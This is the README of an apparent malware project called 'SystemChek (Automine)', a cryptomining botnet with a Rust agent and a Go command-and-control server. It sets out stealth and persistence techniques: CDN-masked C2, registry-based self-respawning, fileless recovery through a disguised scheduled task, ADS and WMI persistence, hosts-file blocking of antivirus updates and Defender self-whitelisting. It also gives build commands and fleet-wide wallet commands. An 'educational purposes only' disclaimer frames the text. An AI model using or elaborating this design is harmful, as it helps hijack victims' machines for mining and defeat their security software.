# SystemChek (Automine)

> **Advanced Persistence & Stealth Mining Node**
> *Strictly for educational and authorized stress-testing purposes.*

## Overview

SystemChek is a highly sophisticated, **autonomous agent** designed for research into advanced persistence, evasion, and secure command & control (C2) architectures. It features a **Secure WebSocket (WSS) C2** utilizing **Ed25519 asymmetric cryptography**, an **Admin Console**, and a resilient **Registry-backed P2P Mesh** for survival.

## Architecture: Secure C2 (WebSockets)

The system has transitioned to a secure, stealth-oriented Client/Server model designed to evade network analysis.

### 1. Transport Security
- **WebSockets (WSS)**: Communication occurs over `wss://` (TLS), making it indistinguishable from normal web traffic.
- **CDN Cloaking**: The Server is designed to sit behind a CDN (like Cloudflare or AWS CloudFront). This **masks the true IP address** of the command server, protecting infrastructure.
- **JSON Envelope**: Protocols use flexible JSON envelopes for ease of evolution.

### 2. Authentication (Ed25519)
- **Zero-Trust**: The Server does not blindly accept connections.
- **Digital Signatures**: Every message (Auth, Heartbeat) from a Client is signed using **Ed25519**.
- **Identity**: Clients generate a keypair locally (`sys_keys.dat`) upon first execution. The Public Key becomes their identity.
- **Verification**: The Server verifies the signature against the Public Key before processing any payload.

### 3. Management
- **Hub-and-Spoke**: The Go-based Server acts as a central Hub.
- **Admin Console**: Real-time CLI for managing the botnet.
    - `list`: View active agents, Mesh health, and wallets.
    - `broadcast-wallet <addr>`: Instantly update mining configurations across the entire fleet.

## Core Capabilities (Agent)

### 1. P2P Graph Mesh Persistence
- **Shared Ledger**: Network state stored in `HKCU\Versions\SystemChek\Nodes`.
- **Mitosis**: If a node is deleted, peers detect it and spawn a replacement in a new random location (e.g., `AppData\Local\Music\Config`).

### 2. Deep Sleeper (Fileless Recovery)
- **Mechanism**: Recovery logic stored as a Base64 blob in Registry.
- **Trigger**: Executed directly from RAM via Scheduled Task (`WindowsHealthUpdate`) if the Mesh is wiped.

### 3. Symbiotic Defense ("The Ouroboros")
- Circular dependency: Mesh protects Sleeper <-> Sleeper restores Mesh.
- **Result**: Administrators must delete Files, Tasks, Registry, and WMI consumers **simultaneously** to remove the agent.

### 4. Shadow Persistence
- **ADS**: Binary hidden in `index.dat:sys_backup` (Alternate Data Stream).
- **WMI**: Event Subscription triggers execution based on System Uptime, bypassing standard "Run" keys.

### 5. Chameleon Protocol (Active Defense)
- **Jamming**: Modifies `hosts` file to block AV update servers (Kaspersky, ESET, Bitdefender, etc.), preventing signature updates.
- **Defender**: Whitelists itself and sets threat actions to `Allow`.

## Project Structure

- `client/`: Rust-based Agent (Miner + Persistence + WSS Client).
- `server/`: Golang-based C2 Server (WebSocket Hub + Admin Console).
- `proto/`: (Legacy/Reference) Functionality moved to JSON/WSS.

## Usage

### 1. Build & Run Server (C2)
Required: Go 1.20+
```bash
cd server
go mod tidy
go build -o sentinel ./cmd/server
./sentinel -addr :8080
```

### 2. Build & Run Client (Agent)
Required: Rust (Cargo)
```bash
cd client
cargo build --release
# Executable is at target/release/automine.exe
```

### 3. Admin Commands
In the Server console:
- `list`: Show connected agents.
- `broadcast-wallet 47ekr...`: Switch all miners to this Monero wallet.

## DISCLAIMER
**This software is for EDUCATIONAL PURPOSES ONLY.**
Unauthorized use of this software on computers you do not own is illegal. The author takes no responsibility for misuse.
